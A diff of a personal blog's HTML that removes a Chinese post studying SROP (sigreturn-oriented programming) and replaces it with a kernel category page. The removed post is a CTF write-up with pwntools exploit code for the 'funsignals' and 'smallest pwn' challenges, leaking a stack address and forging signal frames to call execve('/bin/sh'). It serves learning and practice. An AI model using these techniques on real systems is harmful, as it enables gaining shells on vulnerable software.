@@ -8,7 +8,7 @@
 
 <head>
 
-  <title>SROP学习 | Rin</title>
+  <title>Category: KERNEL | Rin</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -45,13 +45,10 @@
   
 
   <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
-<link rel="stylesheet" href="/css/prism.css" type="text/css"><link rel="stylesheet" href="/assets/css/APlayer.min.css" class="aplayer-style-marker">
-<script src="/assets/js/APlayer.min.js" class="aplayer-script-marker"></script>
-<script src="/assets/js/Meting.min.js" class="meting-script-marker"></script>
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
 
 <!--
-<body class="post-template">
+<body class="home-template">
 -->
 <body id="index" class="lightnav animsition">
       <!-- ============================ Off-canvas navigation =========================== -->
@@ -224,174 +221,69 @@
         <!-- ============================ Header & Logo bar =========================== -->
 
 
-      
-<section id="intro">
-    <div class="container">
-        <div class="row col-md-offset-2">
-            <div class="col-md-8">
-    			<span class="post-meta">
-      <time datetime="2021-11-07T11:11:19.208Z" itemprop="datePublished">
-          2021-11-07
-      </time>
-    
-    
-    | 
-    <a href='/tags/stack/'>stack</a>
-    
-    
-</span>
-                <h1>SROP学习</h1>
+      <!-- ============================ Hero Image =========================== -->
+
+<section id="hero" class="scrollme">
+    <div class="container-fluid element-img" style="background: url(https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/cover.jpg) no-repeat center center fixed;background-size: cover">
+        <div class="row">
+            <div class="col-xs-12 col-sm-8 col-sm-offset-2 col-md-8 col-md-offset-2 vertical-align cover boost text-center">
+                <div class="center-me animateme" data-when="exit" data-from="0" data-to="0.6" data-opacity="0" data-translatey="100">
+                    <div>
+                        
+                        <h2><span>RIN777</span></h2>
+                        <p></p>
+                        
+                        <h2></h2>
+                        <p>努力は嘘をつく、でも無駄にはならない</p>
+                        
+
+                    </div>
+                </div>
             </div>
+            <!-- // .col-md-12 -->
         </div>
-        <div class="col-md-8 col-md-offset-2">
-      		
-    <div id="aplayer-UKZmrNNI" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div> 
-
-<h2><span id="1前言">1)前言</span></h2><p>​        在看完csapp的异常控制流之后，对于信号以及系统调用有了更加深入的了解，故借此机会探明SROP，这个本身并不复杂的知识点。</p>
-<h2><span id="2srop原理">2）SROP原理</span></h2><p>​         当用户向内核发起signal时，此时系统切换为内核态，并且由内核保存进程的上下文（通常是一些寄存器状态）至用户栈，然后切换回用户态，执行信号处理程序。程序执行完毕后，再次切换成内核态，将保存的寄存器状态恢复后返回用户态。</p>
-<p>​        所以这一串来回切换中，一个缺陷就是第一次切换时上下文保存于用户栈中，所以正好我们可以通过栈溢出控制栈中的数据，而且当寄存器恢复时，内核并不会检查栈中的内容是否被篡改。</p>
-<p>​        借一张图说明一下：</p>
-<p><img src="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/ProcessOfSignalHandlering.png" alt="Process of Signal Handlering"></p>
-<h2><span id="3srop利用">3）SROP利用</span></h2><p>​        pwntools中为我们集成了srop利用的工具,接下来我们通过一个极为刻意的例子演示一下如何利用。</p>
-<h3><span id="funsignal">funsignal</span></h3><p>​        题目地址： <a target="_blank" rel="noopener" href="https://github.com/fuurinko/CTF-TASK/blob/main/funsignals_player_bin">funsignals</a> </p>
-<p>​        打开题目，是手写汇编。</p>
-<p>​        <img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8B%E5%8D%883.36.29.png" alt="截屏2021-11-09 下午3.36.29"></p>
-<p>​        观察一下。程序分别通过系统调用，调用了<code>sys_read </code>, <code>sys_sigreturn</code>两个函数。</p>
-<p>​        那么很明显，<code>sys_read</code>用来栈溢出，然后 <code>sys_sigreturn</code>作为返回地址。并且flag的地址都已经给出，我们只需要通过<code>sys_write</code>读出flag的值就行。</p>
-<p>​        所以我们需要构造<code>sys_write</code>的调用</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_write<span class="comment">#write函数的系统调用号</span></span><br><span class="line">frame.rdi = constants.STDOUT_FILENO<span class="comment">#1</span></span><br><span class="line">frame.rsi = elf.symbols[<span class="string">&#x27;flag&#x27;</span>]<span class="comment">#0x010000023</span></span><br><span class="line">frame.rdx = <span class="number">50</span><span class="comment">#读取的字符数</span></span><br><span class="line">frame.rip = elf.symbols[<span class="string">&#x27;syscall&#x27;</span>]</span><br></pre></td></tr></table></figure>
-
-
-
-<p>​        这里就类似pwntools的rop模块，只是把需要的东西生成一下然后存起来。当程序调用<code>sys_read</code>的时候把东西读进用户栈，然后接着调用 <code>sys_sigreturn</code>让内核将用户栈的东西恢复，就相当于调用了<code>sys_write</code>，从而读出flag的值。</p>
-<p>​        但是这道题将我们需要的任何地址都给出了，甚至也不需要构造<code>sys_sigreturn</code>，我们通过另外一个例子来演示一下如何构造<code>sys_sigreturn</code>并且获得一个shell。</p>
-<h3><span id="smallest-pwn">Smallest Pwn</span></h3><p>​        题目：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#360chunqiu2017_smallest">smallest pwn</a></p>
-<p>​        直接先在IDA中查看：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">start           proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:00000000004000B0                 xor     rax, rax</span><br><span class="line">.text:00000000004000B3                 mov     edx, 400h       ; count</span><br><span class="line">.text:00000000004000B8                 mov     rsi, rsp        ; buf</span><br><span class="line">.text:00000000004000BB                 mov     rdi, rax        ; fd</span><br><span class="line">.text:00000000004000BE                 syscall                ; LINUX - sys_read</span><br><span class="line">.text:00000000004000C0                 retn</span><br><span class="line">.text:00000000004000C0 start           endp</span><br><span class="line">.text:00000000004000C0</span><br><span class="line">.text:00000000004000C0 _text           ends</span><br><span class="line">.text:00000000004000C0</span><br><span class="line">.text:00000000004000C0</span><br><span class="line">.text:00000000004000C0                 end start</span><br></pre></td></tr></table></figure>
-
-<h4><span id="ctf-wiki题解">ctf-wiki题解</span></h4><p>​        可以看到程序本身就是一个<code>sys_read</code>。所以我们需要利用它来getshell，难度可想而知。</p>
-<p>​        由于题目只给出了<code>sys_read</code>，但是泄露程序内存我们肯定是需要一个<code>sys_write</code>    的，所以这里有一个trick，就是通过将<code>sys_read</code>的返回值构造成函数的系统调用号。然后调用<code>sys_write</code>以及<code>sys_sigreturn</code>。</p>
-<p>​        那么来看详细的分析</p>
-<p>​        首先需要调用<code>sys_write</code>，系统调用号为4，也就是需要<code>sys_read</code>返回读入四个字符，将rax的值赋为4。</p>
-<p>​        顺便<code>sys_sigreturn</code>的返回值为119。</p>
-<p>​        然后看exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(start_addr) * <span class="number">3</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">## modify the return addr to start_addr+3</span></span><br><span class="line"><span class="comment">## so that skip the xor rax,rax; then the rax=1</span></span><br><span class="line"><span class="comment">## get stack addr</span></span><br><span class="line">sh.send(<span class="string">&#x27;\xb3&#x27;</span>)</span><br><span class="line">stack_addr = u64(sh.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">log.success(<span class="string">&#x27;leak stack addr :&#x27;</span> + <span class="built_in">hex</span>(stack_addr))</span><br></pre></td></tr></table></figure>
-
-
-
-<p>​        首先发送三次<code>start_addr</code>，第一次使得程序执行流重新回到start，但是在重新执行时输入<code>\xb3</code>    ,覆盖我们刚刚输入的三个开始地址中的第二个，以至于程序会重新执行start函数，但是是从<code>0x4000B3</code>开始。(第三个地址的作用会在后面体现)</p>
-<p>​    同时我们读入的<code>\xb3</code>    ,仅有一个字节，这使得<code>sys_read</code>的返回值为1，存在rax中，程序在这里就相当于执行了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov     rax, 1</span><br><span class="line">mov     edx, 400h       ; count</span><br><span class="line">mov     rsi, rsp        ; buf</span><br><span class="line">mov     rdi, rax        ; fd</span><br><span class="line">syscall                ; LINUX - sys_write</span><br></pre></td></tr></table></figure>
-
-<p>所以此时相当于进行了一个系统调用号为1的系统调用,也就是<code>sys_write</code>函数。</p>
-<p>​    并且读出的内容就是rsp的值，也就相当于泄露了一个栈地址。</p>
-<p>​    回忆一下，srop的关键是通过<code>sys_sigreturn</code>来恢复我们构造的用户栈上的寄存器状态，那么现在我们得到了用户栈的地址，我们就能够在用户栈中写入一些我们想要的东西。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## make the rsp point to stack_addr</span></span><br><span class="line"><span class="comment">## the frame is read(0,stack_addr,0x400)</span></span><br><span class="line">sigframe = SigreturnFrame()<span class="comment">#创建一个SigreturnFrame，没啥好说的</span></span><br><span class="line">sigframe.rax = constants.SYS_read<span class="comment">#确定我们希望调用的函数的系统调用号</span></span><br><span class="line">sigframe.rdi = <span class="number">0</span><span class="comment">#read参数</span></span><br><span class="line">sigframe.rsi = stack_addr<span class="comment">#read参数，在栈上读入</span></span><br><span class="line">sigframe.rdx = <span class="number">0x400</span><span class="comment">#read参数，读多大</span></span><br><span class="line">sigframe.rsp = stack_addr<span class="comment">#sigframe参数</span></span><br><span class="line">sigframe.rip = syscall_ret<span class="comment">#sigframe参数，这里是syscall+retn的地址</span></span><br><span class="line">payload = p64(start_addr) + <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + <span class="built_in">str</span>(sigframe)</span><br><span class="line">sh.send(payload)</span><br></pre></td></tr></table></figure>
-
-<p>​    接着我们开始构造<code>sys_sigreturn</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## set rax=15 and call sigreturn</span></span><br><span class="line">sigreturn = p64(syscall_ret) + <span class="string">&#x27;b&#x27;</span> * <span class="number">7</span><span class="comment">#读入15字节</span></span><br><span class="line">sh.send(sigreturn)<span class="comment">#利用与第一段payload同理。将返回地址覆盖成syscall+ret，进行系统调用，而此时rax已经被设置成15.</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>​            这样我们就成功地调用了<code>sys_sigreturn</code>    ,此时我们已经可以向用户栈中读入任意数据了。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## call execv(&quot;/bin/sh&quot;,0,0)</span></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr + <span class="number">0x120</span>  <span class="comment"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">frame_payload = p64(start_addr) + <span class="string">&#x27;b&#x27;</span> * <span class="number">8</span> + <span class="built_in">str</span>(sigframe)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(frame_payload)</span><br><span class="line">payload = frame_payload + (<span class="number">0x120</span> - <span class="built_in">len</span>(frame_payload)) * <span class="string">&#x27;\x00&#x27;</span> + <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(sigreturn)</span><br></pre></td></tr></table></figure>
-
-<p>​        我们再次利用<code>SigreturnFrame()</code>来构造我们读入用户栈的内容。内容也比较直观，就是一个·类似shellcode的东西。然后再调用<code>sys_sigreturn</code>来触发。</p>
-<p>​        所以总结下来就是，先通过读入一个字符覆盖start函数地址，调用<code>sys_write</code>泄露栈地址，通过两次调用<code>sys_sigreturn</code>，第一次执行<code>sys_read</code>，将<code>execute(&quot;/bin/sh&quot;)</code>写入用户栈，第二次调用<code>sys_sigreturn</code>来getshell。</p>
-<h4><span id="自己的反思">自己的反思</span></h4><p>​        有一个疑惑，就是既然我们能够通过控制rax而控制<code>syscall</code>，而普通的<code>sys_read</code>也是将用户输入储存到栈上，那为什么还要多此一举，去获得rsp的地址，再将shellcode写到那上面呢？</p>
-<p>​        怀着这样的问题，果然我在网上找到了一个和我想法完全一致的人。他的exp的关键部分是这样的：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">reread = <span class="number">0x4000b0</span></span><br><span class="line">syscall = <span class="number">0x4000be</span></span><br><span class="line"></span><br><span class="line">rereadaddr = p64(reread)</span><br><span class="line">syscalladdr = p64(syscall)</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">59</span></span><br><span class="line">frame.rdi = <span class="number">0x7fffffffe4e8</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">binsh=<span class="string">&#x27;/bin/sh&#x27;</span> </span><br><span class="line"></span><br><span class="line">playload1 = rereadaddr+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+ <span class="built_in">str</span>(frame)+binsh</span><br><span class="line">p.send(playload1)</span><br><span class="line"></span><br><span class="line">playload2 = syscalladdr+<span class="string">&#x27;a&#x27;</span>*<span class="number">7</span></span><br><span class="line"></span><br><span class="line">p.send(playload2)</span><br><span class="line"><span class="comment">#http://www.reshahar.com/2017/05/04/360春秋杯smallest-pwn的学习与利用/</span></span><br></pre></td></tr></table></figure>
-
-<p>​            </p>
-<p>​        可以看到细节和wiki给出的几乎一样，如果思路行得通，那么应该不会跑出问题，然而当我运行的时候，发现果不其然，EOF了。</p>
-<p>​        去查了一些资料，发现还是对于<code>SigreturnFrame()</code>的理解不够透彻。    </p>
-<p>​        <code>SigreturnFrame()</code>中有一个非常重要的part：<code>sigframe.rsp</code></p>
-<p>​        我们自己构造的寄存器状态肯定是需要rsp的值的，并且这里rsp肯定也是要可写的，不然后面我们无法把getshell的函数写进去，所以我们这里肯定要指定一个可写的栈上的地址。</p>
-<p>​        所以之前那种想法就不攻自破了，在那种情况下我们无法获取任何栈上的地址，自然也没有东西可以填，所以还是需要通过<code>sys_write</code>    ,来回跳转执行流。</p>
-<h2><span id="4总结">4）总结</span></h2><p>​        非常有意思的一个知识点，但是非常奇怪的是我花在理解上的时间比之前任何知识点都短，可能是我之前嗯啃csapp，对于信号，系统调用等稍有了解。也可能是我研究例题的时候完全是参考涅普的视频教程，有pwn奶奶的细节讲解。（这个可能比较重要），说到底还是知识点本身比较简单。</p>
-<h2><span id="5参考">5）参考</span></h2><p>​        </p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_29343201/article/details/72627439">2017 429 ichunqiu ctf smallest(pwn300) writeup</a>        </p>
-<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/#_5">SROP</a></p>
-
-            <div class="clearfix"></div>
-            <hr class="nogutter">
-        </div>
-        <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
-    
-    <a class="pull-left" href="../../11/mess_pwndocker%E7%9A%84pwn%E9%A2%98%E4%BD%93%E9%AA%8C%EF%BC%88%E4%B8%8B%EF%BC%89/" style="float: left;">
-        ← pwndocker的pwn题体验（下
-    </a>
-    
-    
-    <a class="pull-right" href="../../02/mess_pwndocker%E7%9A%84pwn%E9%A2%98%E4%BD%93%E9%AA%8C%EF%BC%88%E4%B8%8A%EF%BC%89/">
-        pwndocker的pwn题体验（上） →
-    </a>
-    
-</nav>
-
-        <div class="col-md-8 col-md-offset-2 col-sm-24"><script type="text/javascript">
-  /**
-   * 搜狐畅言
-   */
-
-  /*
-  document.write('<div id="SOHUCS" sid="' + window.location.pathname.slice(1) + '" ></div>');
-
-  window.onload = function () {
-    (function () {
-      var appid = 'cytXXXX';
-      var conf = 'prod_xxxxxxxxxxxxxxxxx';
-      var width = window.innerWidth || document.documentElement.clientWidth;
-      var loadJs = function (d, a, id) {
-        var c = document.getElementsByTagName("head")[0] || document.head || document.documentElement;
-        var b = document.createElement("script");
-        b.setAttribute("type", "text/javascript");
-        b.setAttribute("charset", "UTF-8");
-        b.setAttribute("src", d);
-        if (id) {
-          b.setAttribute("id", id);
-        }
-        if (typeof a === "function") {
-          if (window.attachEvent) {
-            b.onreadystatechange = function () {
-              var e = b.readyState;
-              if (e === "loaded" || e === "complete") {
-                b.onreadystatechange = null;
-                a()
-              }
-            }
-          } else {
-            b.onload = a
-          }
-        }
-        c.appendChild(b)
-      };
-
-      loadJs("https://changyan.sohu.com/upload/changyan.js", function () {
-        window.changyan.api.config({
-          appid: appid,
-          conf: conf
-        })
-      });
-    })();
-  }
-  */
-
-</script>
-</div>
+        <div class="herofade beige-dk"></div>
     </div>
 </section>
 
-<!-- Highlight.js -->
+<!-- Height spacing helper -->
+<div class="heightblock"></div>
+<!-- // End height spacing helper -->
 
-<link rel="stylesheet"
-href="//highlightjs.org/static/demo/styles/atom-one-light.css">
-<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js">
-</script>
-<script>
-hljs.initHighlightingOnLoad();
-
-</script>
+<!-- ============================ END Hero Image =========================== -->
 
 
+
+
+<section id="services">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-10 col-md-offset-1">
+                <div class="row boxes">
+                    
+                    
+                        
+                        
+                        <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 wow fadeInUp" data-wow-delay="0.3s">
+                            
+                              <h4 class="title"><a href="/2022/07/14/kernel_环境搭建及基础知识/">kernel环境+基础知识</a></h4>
+                            
+                            <p><time datetime="2022-07-14T14:09:06.354Z"><a href="/2022/07/14/kernel_环境搭建及基础知识/">2022-07-14</a></time></p>
+                        </div>
+                    
+                </div>
+            </div>    
+        </div>
+    </div>
+</section> 
+
+<section id="statement">
+    <div class="container text-center wow fadeInUp" data-wow-delay="0.5s">
+        <div class="row">
+            <p>“试着开心，好吗？”</p>
+        </div>
+    </div>
+</section>
       
 <!-- ============================ Footer =========================== -->
 
